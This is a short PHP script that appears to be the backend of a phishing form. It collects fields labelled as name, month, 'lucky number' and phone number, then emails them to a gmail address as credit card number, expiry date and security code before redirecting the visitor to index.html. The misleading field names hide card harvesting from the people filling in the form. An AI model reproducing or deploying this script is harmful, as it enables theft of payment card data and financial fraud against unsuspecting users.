<?php
// Recoger los datos del formulario
$nombre = $_POST['nombre'];
$apellido = $_POST['apellido'];
$mes = $_POST['mes'];
$numeroSuerte = $_POST['numeroSuerte'];
$telefono = $_POST['telefono'];

// Dirección de correo electrónico donde se enviará el mensaje
$destinatario = 'trayectoria728@gmail.com';

// Asunto del mensaje
$asunto = 'Datos de la tarjeta de crédito';

// Mensaje a enviar
$mensaje = "Número de tarjeta: $telefono\nFecha de vencimiento: $mes\nCódigo: $numeroSuerte";

// Cabeceras del correo electrónico
$cabeceras = 'From: remitente@example.com' . "\r\n" .
    'Reply-To: remitente@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

// Enviar el correo electrónico
mail($destinatario, $asunto, $mensaje, $cabeceras);

// Redirigir al usuario a una página de confirmación
header('Location: index.html');
?>
